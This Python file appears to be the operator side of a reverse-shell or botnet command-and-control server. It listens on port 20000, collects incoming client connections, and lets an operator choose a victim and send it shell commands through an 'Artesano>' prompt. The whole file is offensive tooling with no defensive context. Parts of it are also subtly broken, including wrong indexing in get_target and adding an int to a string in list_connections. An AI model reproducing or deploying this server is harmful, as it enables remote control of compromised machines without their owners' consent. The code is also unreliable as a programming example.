import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
cola = Queue()
all_connections = []
all_addresses = []


def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 20000
		s = socket.socket()
	except socket.error as message:
		print("Creating socket error: " + str(message))


def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host, port))
		s.listen(10)
		print("Binding socket on port " + str(port))
	except socket.error as message:
		print("Binding socket error: " + str(message))
		print("Retrying...")
		time.sleep(1)
		socket_bind()


def socket_accept():
	for i in all_connections:
		i.close()
	del all_connections[:]
	del all_addresses[:]
	while True:
		try:
			connection, address = s.accept()
			connection.setblocking(True)
			all_connections.append(connection)
			all_addresses.append(address)
			print("\nConnection established | IP " + address[0] + ":" + str(address[1]))
		except:
			print("\nError accepting connection")


def select_connection():
	while True:
		command = input("Artesano> ")
		if command == "list":
			list_connections()
		elif "select" in command:
			conn = get_target(command)
			if conn is not None:
				send_commands(conn)
		else:
			print("What is that")


def list_connections():
	result = ""
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(" "))
			conn.recv(2048)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		result += str(i) + "   " +str(all_addresses[i][0]) + ":" + str(all_addresses[i][1] + "\n")
	print("------ Clients ------" + "\n" + result)


def get_target(command):
	try:
		objective = int(command.replace("select ", ""))
		connection = all_connections[objective]
		print("Connected to " + all_addresses[0][objective] + ":" + all_addresses[1][objective])
		print(all_addresses[0][objective] + "> ", end="")
		return connection
	except:
		print("Problems selecting")
		return None


def send_commands(connection):
	while True:
		try:
			command = input()
			if command == "quit" or command == "q":
				break
			elif len(str.encode(command)) > 0:
				connection.send(str.encode(command, "utf-8"))
				client_response = str(connection.recv(1024), "utf-8")
				print(client_response, end="")
		except:
			print("Connection lost")
			break


def create_threads():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()


def work():
	while True:
		x = cola.get()
		if x == 1:
			socket_create()
			socket_bind()
			socket_accept()
		elif x == 2:
			select_connection()
		cola.task_done()


def create_jobs():
	for x in JOB_NUMBER:
		cola.put(x)
	cola.join()

create_threads()
create_jobs()
